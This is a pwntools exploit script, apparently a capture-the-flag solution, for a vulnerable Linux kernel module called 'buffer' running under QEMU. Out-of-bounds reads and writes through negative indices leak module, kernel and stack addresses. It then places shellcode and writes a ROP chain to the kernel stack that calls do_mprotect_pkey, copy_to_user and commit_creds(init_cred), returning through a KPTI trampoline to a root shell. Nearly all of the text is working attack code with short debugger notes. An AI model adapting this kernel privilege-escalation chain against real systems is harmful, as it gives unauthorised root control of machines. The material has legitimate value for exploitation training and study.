#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 4000

# dont forget to: patchelf --set-interpreter /tmp/ld-2.27.so ./test
# dont forget to set conext.arch. E.g amd64

from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './start-qemu.sh'
context.terminal = ['tmux', 'new-window']
argv = []
env = {}

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

def add(idx, sz):
    io.sendlineafter("> ", "1")
    io.sendlineafter("index: ", str(idx))
    io.sendlineafter("size: ", str(sz))

def edit(idx, sz, data):
    io.sendlineafter("> ", "2")
    io.sendlineafter("index: ", str(idx))
    io.sendlineafter("size: ", str(sz))
    io.sendlineafter("data: ", str(data))

def show(idx, sz):
    io.sendlineafter("> ", "3")
    io.sendlineafter("index: ", str(idx))
    io.sendlineafter("size: ", str(sz))

def rem(idx):
    io.sendlineafter("> ", "4")
    io.sendlineafter("index: ", str(idx))

def print_leaks(leaks):
    for i in range(0, len(leaks), 8):
        print(hex(u64(leaks[i:i+8])))

def is_kernel_ptr(val):
    return (val & 0xffffffff00000000) == 0xffffffff00000000

def is_heap_ptr(val):
    return (val & 0xffff000000000000) == 0xffff000000000000

def get_leak():
    ret = b""
    io.recvuntil("Data: ")
    leaks = io.recvuntil("\n").split()
    for x in leaks:
        ret += p8(int(x, 16))

    return ret 

def sign_extend(value, bits):
    sign_bit = 1 << (bits - 1)
    return (value & (sign_bit - 1)) - (value & sign_bit)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start(argv, env=env)

'''
The ending of a module struct has some nice features for us.
There is a linked list of dependency and dependee modules.
Because this driver is all by itself, these pointers all point
back to themselves

pwndbg> x/-8gx 0xffffffffc0331400
0xffffffffc03313c0:	0xffffffffc03313c0	0xffffffffc03313c0
0xffffffffc03313d0:	0xffffffffc03313d0	0xffffffffc03313d0
0xffffffffc03313e0:	0xffffffffc032f1fb	0x0000000000000003
0xffffffffc03313f0:	0x0000000000000000	0x0000000000000000

=> buf[-7 / -8] allows for module leak
'''
show(-8, 0x8)

module_leak = u64(get_leak()[:8])

module_struct = module_leak -0x280
module_text = module_leak - 0x23c0
module_data = module_leak - 0x3c0
module_bss = module_leak + 0x40

log.success("module struct: %#x" % module_struct)
log.success("module text:   %#x" % module_text)
log.success("module data:   %#x" % module_data)
log.success("module bss:    %#x" % module_bss)

'''
/ # cat /sys/module/buffer/sections/.bss
0xffffffffc0331400

 x/-4gx 0xffffffffc0331400
0xffffffffc03313e0:	0xffffffffc032f1fb	0x0000000000000003
0xffffffffc03313f0:	0x0000000000000000	0x0000000000000000

/ # cat /proc/kallsyms | grep "\[buffer"
ffffffffc032f140 t module_ioctl	[buffer]

ffffffffc032f1fb t module_cleanup	[buffer]

ffffffffc032f040 t buffer_del	[buffer]
ffffffffc032f1fb t cleanup_module	[buffer]
ffffffffc032f090 t buffer_edit	[buffer]
ffffffffc032f000 t buffer_new	[buffer]
ffffffffc032f0e0 t buffer_show	[buffer]

=> buf[-4] = module_cleanup

void cleanup_module(void)

{
  cdev_del(c_dev);
  unregister_chrdev_region(dev_id,1);
  return;
}

=> cdev_del is kernel func

ffffffffc01f81fb t module_cleanup	[buffer]

0xffffffffc01f81fb:	push   rbp
0xffffffffc01f81fc:	mov    rdi,0xffffffffc01fa480
0xffffffffc01f8203:	mov    rbp,rsp
0xffffffffc01f8206:	call   0xffffffff8594e240

pwndbg> x/gx 0xffffffffc01f8206
0xffffffffc01f8206:	0xd73d8bc5756035e8

=> address of cdev is calculated relative to next instruction (opcode e8)
=> offset = 


'''

cleanup_module = module_text + 0x1fb

print(hex(cleanup_module))

show(-4, 0x10)
k_leak = get_leak()
# rel offset to next instr
off = u32(k_leak[0xc:0xc+0x4])
# https://www.felixcloutier.com/x86/call
# e8 rel32
off = sign_extend(off, 0x20)
cdev_del = cleanup_module + 0x10 + off
k_base = cdev_del - 0x14e240

log.success("k_base: %#x" % k_base)

# buf[-7] -> buf[0]
edit(-7, 0x8, p64(module_bss).hex())

# buf[0] -> buf[1]
edit(-8, 0x8, p64(module_bss + 0x8).hex())

init_task = k_base + 0xe12580
'''
tasks member of task_struct 

https://docs.huihoo.com/doxygen/linux/kernel/3.7/structtask__struct.html
'''
task_ll = init_task + 0x2f0

log.success("task_ll: %#x" % task_ll)

# read prev of list_head member == last task started
edit(0, 0x8, p64(task_ll + 0x8).hex())

show(1, 0x8)
task_leak = u64(get_leak()[:0x8])
task_leak = task_leak - 0x2f0

'''
verify that we actually have the correct task struct by checking that
the comm field contains the string "interface"
'''
edit(0, 0x8, p64(task_leak).hex())
show(1, 0x600)

if not b"interface" in get_leak():
    log.error("Leaking interface task struct failed")
    exit(1)

log.success("task_leak: %#x" % task_leak)

edit(0, 0x8, p64(task_leak + 0x20).hex())
show(1, 0x8)
stack_leak = u64(get_leak()[:0x8])

log.success("task->stack leak: %#x" % stack_leak)

'''
task->stack points to thread_info struct.
By adding and offset to that pointer we can leak stuff
from the kernel stack.

https://stackoverflow.com/questions/59054053/linux-kernel-task-struct-void-stack
'''
edit(0, 0x8, p64(stack_leak + 0x3f70).hex())
show(1, 0x10)

leaks = get_leak()

user_rip = u64(leaks[:8])
user_stack = u64(leaks[8:])

log.success("user_rip: %#x" % user_rip)
log.success("user_stack: %#x" % user_stack)

sc = b"\x90"*(0x500)
sc += asm(shellcraft.sh())

add(2, len(sc))
edit(2, len(sc), sc.hex())

edit(0, 0x8, p64(module_bss + 0x10).hex())
show(1, 0x8)

sc_leak = u64(get_leak()[:0x8])

log.success("sc_leak: %#x" % sc_leak)

kpti_tramp= k_base + (0xffffffff81800e10 - 0xffffffff81000000) + 0x16;
copy_to_user = k_base + (0xffffffff81269780 - 0xffffffff81000000);
do_mprotect_pkey = k_base + (0xffffffff811224f0 - 0xffffffff81000000);
poprdi = k_base + (0xffffffff8114078a - 0xffffffff81000000);
poprsi = k_base + (0xffffffff810ce28e - 0xffffffff81000000);
poprdx = k_base + (0xffffffff81145369 - 0xffffffff81000000);
poprcx = k_base + (0xffffffff810eb7e4 - 0xffffffff81000000);
init_cred = k_base + (0xffffffff81e37a60 - 0xffffffff81000000);
commit_cred = k_base + (0xffffffff810723c0 - 0xffffffff81000000);

log.success("do_mprotect_pkey: %#x", do_mprotect_pkey)

PROT_READ = 0x1
PROT_WRITE = 0x2
PROT_EXEC = 0x4

'''
change permissions of parts of .text section of user process to rwx

0xfffffffffffff000 because needs to be page aligned
'''
rop = p64(poprdi)
rop += p64(user_rip & 0xfffffffffffff000)
rop += p64(poprsi)
rop += p64(len(sc)) 
rop += p64(poprdx)
rop += p64(PROT_READ | PROT_WRITE | PROT_EXEC)
rop += p64(poprcx)
rop += p64(0xffffffffffffffff)
rop += p64(do_mprotect_pkey)
'''
write shellcode to parts of .text section we made rwx
'''
rop += p64(poprdi)
rop += p64(user_rip & 0xfffffffffffff000)
rop += p64(poprsi)
rop += p64(sc_leak)
rop += p64(poprdx)
rop += p64(len(sc))
rop += p64(copy_to_user)
'''
install init_cred (root) for current task and return to our shellcode
in user space
'''
rop += p64(poprdi)
rop += p64(init_cred)
rop += p64(commit_cred)
rop += p64(kpti_tramp)
rop += p64(0x0)
rop += p64(0x0)
rop += p64(user_rip & 0xfffffffffffff000)
rop += p64(0x33)
rop += p64(0x216)
rop += p64(user_stack)
rop += p64(0x2b)
rop += p64(0xdeadbeef)
rop += p64(0x4244)

'''
write rop chain to kernel stack. Upon return from the ioctl handler the 
kernel will execute the chain since we overwrote the ret ptr
'''
edit(0, 0x8, p64(stack_leak + 0x3e78).hex())
edit(1, len(rop), rop.hex())

io.interactive()

